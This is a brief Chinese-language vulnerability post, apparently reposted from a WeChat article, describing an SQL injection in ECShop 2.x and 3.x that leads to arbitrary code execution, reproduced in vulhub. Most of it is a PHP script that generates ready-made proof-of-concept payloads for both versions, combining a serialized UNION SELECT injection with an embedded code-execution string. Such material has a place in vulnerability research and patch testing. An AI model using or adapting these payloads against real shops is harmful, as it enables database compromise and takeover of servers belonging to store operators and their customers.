# ECShop 2.x/3.x SQL注入/任意代码执行漏洞

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzAxMjE3ODU3MQ==&mid=2650462226&idx=3&sn=0dfbc72dd696510192088f27fd1397a2&chksm=83bbbdf6b4cc34e0e25657497ea9eee2cb6be7cb6eb4c8c55e0c5fba5859c12dbadd1dcda979&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650462226&idx=3&sn=0dfbc72dd696510192088f27fd1397a2&chksm=83bbbdf6b4cc34e0e25657497ea9eee2cb6be7cb6eb4c8c55e0c5fba5859c12dbadd1dcda979&scene=27#wechat_redirect)

ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。

  

其2017年及以前的版本中，存在一处SQL注入漏洞，通过该漏洞可注入恶意数据，最终导致任意代码执行漏洞。其3.6.0最新版已修复该漏洞，vulhub中使用其2.7.3最新版与3.6.0次新版进行漏洞复现。

生成2.x和3.x的POC

  

1.  <?php  
    
2.  $shell = bin2hex("{\\$asd'\];phpinfo\\t();//}xxx");  
    
3.  $id = "-1' UNION/\*";  
    
4.  $arr = \[  
    
5.      "num" => sprintf('\*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -', bin2hex($id), $shell),  
    
6.      "id" => $id  
    
7.  \];  
    
8.    
    
9.  $s = serialize($arr);  
    
10.    
     
11.  $hash3 = '45ea207d7a2b68c49582d2d22adf953a';  
     
12.  $hash2 = '554fcae493e564ee0dc75bdf2ebf94ca';  
     
13.    
     
14.  echo "POC for ECShop 2.x: \\n";  
     
15.  echo "{$hash2}ads|{$s}{$hash2}";  
     
16.  echo "\\n\\nPOC for ECShop 3.x: \\n";  
     
17.  echo "{$hash3}ads|{$s}{$hash3}";
